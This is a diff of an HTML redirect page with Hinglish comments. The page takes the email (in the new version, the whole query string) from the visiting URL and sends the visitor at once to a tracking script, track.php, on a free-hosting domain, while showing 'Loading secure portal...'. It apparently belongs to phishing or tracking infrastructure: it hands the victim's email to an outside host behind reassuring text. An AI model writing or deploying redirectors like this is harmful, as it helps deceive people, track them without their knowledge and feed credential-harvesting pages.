@@ -2,25 +2,18 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Loading Portal...</title>
+    <title>Redirecting...</title>
     <script>
-        // URL se ?email=... parameter ko capture karo
-        const urlParams = new URLSearchParams(window.location.search);
-        const email = urlParams.get('email');
+        // URL ke parameters (jaise ?email=...) ko pakdo
+        const queryString = window.location.search;
         
-        // Base target URL jo tere InfinityFree backend par jayega
-        let targetUrl = "https://resolven.infinityfree.io/index.php";
+        // InfinityFree par bani nayi track.php file par redirect karo
+        const targetUrl = "https://resolven.infinityfree.io/track.php" + queryString;
         
-        // Agar email parameter hai, toh usko aage pass kar do
-        if (email) {
-            targetUrl += "?email=" + encodeURIComponent(email);
-        }
-        
-        // Bina kisi delay ke user ko InfinityFree par bhej do
         window.location.replace(targetUrl);
     </script>
 </head>
 <body>
-    <p style="font-family: Arial; text-align: center; margin-top: 50px; color: #666;">Redirecting to secure portal...</p>
+    <p style="text-align:center; margin-top:50px; font-family:Arial; color:#666;">Loading secure portal...</p>
 </body>
 </html>
